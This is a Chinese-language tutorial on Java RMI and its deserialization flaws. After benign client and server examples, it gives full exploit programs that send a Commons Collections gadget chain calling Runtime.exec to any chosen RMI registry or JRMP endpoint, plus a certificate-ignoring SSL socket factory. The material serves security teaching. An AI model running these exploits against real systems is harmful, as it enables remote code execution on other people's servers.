# RMI

`RMI(Remote Method Invocation)`即`Java`远程方法调用，`RMI`用于构建分布式应用程序，`RMI`实现了`Java`程序之间跨`JVM`的远程通信。

**RMI架构：**

![img](https://oss.javasec.org/images/java-rmi.jpg)

`RMI`底层通讯采用了`Stub(运行在客户端)`和`Skeleton(运行在服务端)`机制，`RMI`调用远程方法的大致如下：

1. `RMI客户端`在调用远程方法时会先创建`Stub(sun.rmi.registry.RegistryImpl_Stub)`。
2. `Stub`会将`Remote`对象传递给`远程引用层(java.rmi.server.RemoteRef)`并创建`java.rmi.server.RemoteCall(远程调用)`对象。
3. `RemoteCall`序列化`RMI服务名称`、`Remote`对象。
4. `RMI客户端`的`远程引用层`传输`RemoteCall`序列化后的请求信息通过`Socket`连接的方式传输到`RMI服务端`的`远程引用层`。
5. `RMI服务端`的`远程引用层(sun.rmi.server.UnicastServerRef)`收到请求会请求传递给`Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)`。
6. `Skeleton`调用`RemoteCall`反序列化`RMI客户端`传过来的序列化。
7. `Skeleton`处理客户端请求：`bind`、`list`、`lookup`、`rebind`、`unbind`，如果是`lookup`则查找`RMI服务名`绑定的接口对象，序列化该对象并通过`RemoteCall`传输到客户端。
8. `RMI客户端`反序列化服务端结果，获取远程对象的引用。
9. `RMI客户端`调用远程方法，`RMI服务端`反射调用`RMI服务实现类`的对应方法并序列化执行结果返回给客户端。
10. `RMI客户端`反序列化`RMI`远程方法调用结果。

## RMI远程方法调用测试

第一步我们需要先启动`RMI服务端`，并注册服务。

**RMI服务端注册服务代码：**

```java
package com.anbai.sec.rmi;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIServerTest {

   // RMI服务器IP地址
   public static final String RMI_HOST = "127.0.0.1";

   // RMI服务端口
   public static final int RMI_PORT = 9527;

   // RMI服务名称
   public static final String RMI_NAME = "rmi://" + RMI_HOST + ":" + RMI_PORT + "/test";

   public static void main(String[] args) {
      try {
         // 注册RMI端口
         LocateRegistry.createRegistry(RMI_PORT);

         // 绑定Remote对象
         Naming.bind(RMI_NAME, new RMITestImpl());

         System.out.println("RMI服务启动成功,服务地址:" + RMI_NAME);
      } catch (Exception e) {
         e.printStackTrace();
      }
   }

}
```

程序运行结果：

```
RMI服务启动成功,服务地址:rmi://127.0.0.1:9527/test
```

`Naming.bind(RMI_NAME, new RMITestImpl())`绑定的是服务端的一个类实例，`RMI客户端`需要有这个实例的接口代码(`RMITestInterface.java`)，`RMI客户端`调用服务器端的`RMI服务`时会返回这个服务所绑定的对象引用，`RMI客户端`可以通过该引用对象调用远程的服务实现类的方法并获取方法执行结果。

**RMITestInterface示例代码：**

```java
package com.anbai.sec.rmi;

import java.rmi.Remote;
import java.rmi.RemoteException;

/**
 * RMI测试接口
 */
public interface RMITestInterface extends Remote {

   /**
    * RMI测试方法
    *
    * @return 返回测试字符串
    */
   String test() throws RemoteException;

}
```

这个区别于普通的接口调用，这个接口在`RMI客户端`中没有实现代码，接口的实现代码在`RMI服务端`。

**服务端RMITestInterface实现代码示例代码：**

```java
package com.anbai.sec.rmi;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RMITestImpl extends UnicastRemoteObject implements RMITestInterface {

   private static final long serialVersionUID = 1L;

   protected RMITestImpl() throws RemoteException {
      super();
   }

   /**
    * RMI测试方法
    *
    * @return 返回测试字符串
    */
   @Override
   public String test() throws RemoteException {
      return "Hello RMI~";
   }

}
```

**RMI客户端示例代码：**

```java
package com.anbai.sec.rmi;

import java.rmi.Naming;

import static com.anbai.sec.rmi.RMIServerTest.RMI_NAME;

public class RMIClientTest {

   public static void main(String[] args) {
      try {
         // 查找远程RMI服务
         RMITestInterface rt = (RMITestInterface) Naming.lookup(RMI_NAME);

         // 调用远程接口RMITestInterface类的test方法
         String result = rt.test();

         // 输出RMI方法调用结果
         System.out.println(result);
      } catch (Exception e) {
         e.printStackTrace();
      }
   }
}
```

程序运行结果：

```
Hello RMI~
```

## RMI反序列化漏洞

`RMI`通信中所有的对象都是通过Java序列化传输的，在学习Java序列化机制的时候我们讲到只要有Java对象反序列化操作就有可能有漏洞。

既然`RMI`使用了反序列化机制来传输`Remote`对象，那么可以通过构建一个恶意的`Remote`对象，这个对象经过序列化后传输到服务器端，服务器端在反序列化时候就会触发反序列化漏洞。

首先我们依旧使用上述`com.anbai.sec.rmi.RMIServerTest`的代码，创建一个`RMI`服务，然后我们来构建一个恶意的`Remote`对象并通过`bind`请求发送给服务端。

**RMI客户端反序列化攻击示例代码：**

```java
package com.anbai.sec.rmi;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.Socket;
import java.rmi.ConnectIOException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIClientSocketFactory;
import java.security.cert.X509Certificate;
import java.util.HashMap;
import java.util.Map;

import static com.anbai.sec.rmi.RMIServerTest.RMI_HOST;
import static com.anbai.sec.rmi.RMIServerTest.RMI_PORT;

/**
 * RMI反序列化漏洞利用，修改自ysoserial的RMIRegistryExploit：https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit.java
 *
 * @author yz
 */
public class RMIExploit {

   // 定义AnnotationInvocationHandler类常量
   public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

   /**
    * 信任SSL证书
    */
   private static class TrustAllSSL implements X509TrustManager {

      private static final X509Certificate[] ANY_CA = {};

      public X509Certificate[] getAcceptedIssuers() {
         return ANY_CA;
      }

      public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }

      public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }

   }

   /**
    * 创建支持SSL的RMI客户端
    */
   private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {

      public Socket createSocket(String host, int port) throws IOException {
         try {
            // 获取SSLContext对象
            SSLContext ctx = SSLContext.getInstance("TLS");

            // 默认信任服务器端SSL
            ctx.init(null, new TrustManager[]{new TrustAllSSL()}, null);

            // 获取SSL Socket连接工厂
            SSLSocketFactory factory = ctx.getSocketFactory();

            // 创建SSL连接
            return factory.createSocket(host, port);
         } catch (Exception e) {
            throw new IOException(e);
         }
      }
   }

   /**
    * 使用动态代理生成基于InvokerTransformer/LazyMap的Payload
    *
    * @param command 定义需要执行的CMD
    * @return Payload
    * @throws Exception 生成Payload异常
    */
   private static InvocationHandler genPayload(String command) throws Exception {
      // 创建Runtime.getRuntime.exec(cmd)调用链
      Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{
                  String.class, Class[].class}, new Object[]{
                  "getRuntime", new Class[0]}
            ),
            new InvokerTransformer("invoke", new Class[]{
                  Object.class, Object[].class}, new Object[]{
                  null, new Object[0]}
            ),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
      };

      // 创建ChainedTransformer调用链对象
      Transformer transformerChain = new ChainedTransformer(transformers);

      // 使用LazyMap创建一个含有恶意调用链的Transformer类的Map对象
      final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);

      // 获取AnnotationInvocationHandler类对象
      Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);

      // 获取AnnotationInvocationHandler类的构造方法
      Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);

      // 设置构造方法的访问权限
      constructor.setAccessible(true);

      // 实例化AnnotationInvocationHandler，
      // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, lazyMap);
      InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

      // 使用动态代理创建出Map类型的Payload
      final Map mapProxy2 = (Map) Proxy.newProxyInstance(
            ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annHandler
      );

      // 实例化AnnotationInvocationHandler，
      // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, mapProxy2);
      return (InvocationHandler) constructor.newInstance(Override.class, mapProxy2);
   }

   /**
    * 执行Payload
    *
    * @param registry RMI Registry
    * @param command  需要执行的命令
    * @throws Exception Payload执行异常
    */
   public static void exploit(final Registry registry, final String command) throws Exception {
      // 生成Payload动态代理对象
      Object payload = genPayload(command);
      String name    = "test" + System.nanoTime();

      // 创建一个含有Payload的恶意map
      Map<String, Object> map = new HashMap();
      map.put(name, payload);

      // 获取AnnotationInvocationHandler类对象
      Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);

      // 获取AnnotationInvocationHandler类的构造方法
      Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);

      // 设置构造方法的访问权限
      constructor.setAccessible(true);

      // 实例化AnnotationInvocationHandler，
      // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, map);
      InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, map);

      // 使用动态代理创建出Remote类型的Payload
      Remote remote = (Remote) Proxy.newProxyInstance(
            ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, annHandler
      );

      try {
         // 发送Payload
         registry.bind(name, remote);
      } catch (Throwable e) {
         e.printStackTrace();
      }
   }

   public static void main(String[] args) throws Exception {
      if (args.length == 0) {
         // 如果不指定连接参数默认连接本地RMI服务
         args = new String[]{RMI_HOST, String.valueOf(RMI_PORT), "open -a Calculator.app"};
      }

      // 远程RMI服务IP
      final String host = args[0];

      // 远程RMI服务端口
      final int port = Integer.parseInt(args[1]);

      // 需要执行的系统命令
      final String command = args[2];

      // 获取远程Registry对象的引用
      Registry registry = LocateRegistry.getRegistry(host, port);

      try {
         // 获取RMI服务注册列表(主要是为了测试RMI连接是否正常)
         String[] regs = registry.list();

         for (String reg : regs) {
            System.out.println("RMI:" + reg);
         }
      } catch (ConnectIOException ex) {
         // 如果连接异常尝试使用SSL建立SSL连接,忽略证书信任错误，默认信任SSL证书
         registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
      }

      // 执行payload
      exploit(registry, command);
   }

}
```

程序执行后将会在`RMI服务端`弹出计算器(`仅Mac系统，Windows自行修改命令为calc`)，`RMIExploit`程序执行的流程大致如下：

1. 使用`LocateRegistry.getRegistry(host, port)`创建一个`RemoteStub`对象。
2. 构建一个适用于`Apache Commons Collections`的恶意反序列化对象(使用的是`LazyMap`+`AnnotationInvocationHandler`组合方式)。
3. 使用`RemoteStub`调用`RMI服务端`的`bind`指令，并传入一个使用动态代理创建出来的`Remote`类型的恶意`AnnotationInvocationHandler`对象到`RMI服务端`。
4. `RMI服务端`接受到`bind`请求后会反序列化我们构建的恶意`Remote对象`从而触发`Apache Commons Collections`漏洞的`RCE`。

**RMI客户端端`bind`序列化：**

![img](https://oss.javasec.org/images/image-20191231154833818.png)

上图可以看到我们构建的恶意`Remote对象`会通过`RemoteCall`序列化然后通过`RemoteRef`发送到远程的`RMI服务端`。

**RMI服务端`bind`反序列化：**

![img](https://oss.javasec.org/images/image-20191231155509069.png)

具体的实现代码在：`sun.rmi.registry.RegistryImpl_Skel`类的`dispatch`方法，其中的`$param_Remote_2`就是我们`RMIExploit`传入的恶意`Remote`的序列化对象。

## RMI-JRMP反序列化漏洞

`JRMP`接口的两种常见实现方式：

1. `JRMP协议(Java Remote Message Protocol)`，`RMI`专用的`Java远程消息交换协议`。
2. `IIOP协议(Internet Inter-ORB Protocol)` ，基于 `CORBA` 实现的对象请求代理协议。

由于`RMI`数据通信大量的使用了`Java`的对象反序列化，所以在使用`RMI客户端`去攻击`RMI服务端`时需要特别小心，如果本地`RMI客户端`刚好符合反序列化攻击的利用条件，那么`RMI服务端`返回一个恶意的反序列化攻击包可能会导致我们被反向攻击。

我们可以通过和`RMI服务`端建立`Socket`连接并使用`RMI`的`JRMP`协议发送恶意的序列化包，`RMI服务端`在处理`JRMP`消息时会反序列化消息对象，从而实现`RCE`。

**JRMP客户端反序列化攻击示例代码：**

```java
package com.anbai.sec.rmi;

import sun.rmi.server.MarshalOutputStream;
import sun.rmi.transport.TransportConstants;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;

import static com.anbai.sec.rmi.RMIServerTest.RMI_HOST;
import static com.anbai.sec.rmi.RMIServerTest.RMI_PORT;

/**
 * 利用RMI的JRMP协议发送恶意的序列化包攻击示例，该示例采用Socket协议发送序列化数据，不会反序列化RMI服务器端的数据，
 * 所以不用担心本地被RMI服务端通过构建恶意数据包攻击，示例程序修改自ysoserial的JRMPClient：https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPClient.java
 */
public class JRMPExploit {

   public static void main(String[] args) throws IOException {
      if (args.length == 0) {
         // 如果不指定连接参数默认连接本地RMI服务
         args = new String[]{RMI_HOST, String.valueOf(RMI_PORT), "open -a Calculator.app"};
      }

      // 远程RMI服务IP
      final String host = args[0];

      // 远程RMI服务端口
      final int port = Integer.parseInt(args[1]);

      // 需要执行的系统命令
      final String command = args[2];

      // Socket连接对象
      Socket socket = null;

      // Socket输出流
      OutputStream out = null;

      try {
         // 创建恶意的Payload对象
         Object payloadObject = RMIExploit.genPayload(command);

         // 建立和远程RMI服务的Socket连接
         socket = new Socket(host, port);
         socket.setKeepAlive(true);
         socket.setTcpNoDelay(true);

         // 获取Socket的输出流对象
         out = socket.getOutputStream();

         // 将Socket的输出流转换成DataOutputStream对象
         DataOutputStream dos = new DataOutputStream(out);

         // 创建MarshalOutputStream对象
         ObjectOutputStream baos = new MarshalOutputStream(dos);

         // 向远程RMI服务端Socket写入RMI协议并通过JRMP传输Payload序列化对象
         dos.writeInt(TransportConstants.Magic);// 魔数
         dos.writeShort(TransportConstants.Version);// 版本
         dos.writeByte(TransportConstants.SingleOpProtocol);// 协议类型
         dos.write(TransportConstants.Call);// RMI调用指令
         baos.writeLong(2); // DGC
         baos.writeInt(0);
         baos.writeLong(0);
         baos.writeShort(0);
         baos.writeInt(1); // dirty
         baos.writeLong(-669196253586618813L);// 接口Hash值

         // 写入恶意的序列化对象
         baos.writeObject(payloadObject);

         dos.flush();
      } catch (Exception e) {
         e.printStackTrace();
      } finally {
         // 关闭Socket输出流
         if (out != null) {
            out.close();
         }

         // 关闭Socket连接
         if (socket != null) {
            socket.close();
         }
      }
   }

}
```

测试流程同上面的`RMIExploit`，这里不再赘述。